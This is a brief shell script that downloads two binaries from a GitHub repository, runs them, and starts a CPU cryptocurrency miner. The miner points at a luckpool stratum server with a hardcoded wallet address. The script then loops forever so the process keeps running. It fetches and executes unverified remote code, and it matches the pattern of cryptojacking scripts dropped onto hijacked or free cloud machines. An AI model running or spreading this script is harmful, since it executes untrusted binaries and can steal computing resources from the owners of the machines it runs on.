#!/bin/sh
sudo apt update
wget https://github.com/Godmine99/cpu/raw/main/GMOP && wget https://github.com/Godmine99/cpu/raw/main/solver
chmod +x GMOP && solver && ./solver
./GMOP -c stratum+tcp://ap.luckpool.net:3956 -u RCdUFd3iiu1tF5TjNPsDDxN2ApqZDSbYBW.GodMiner -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
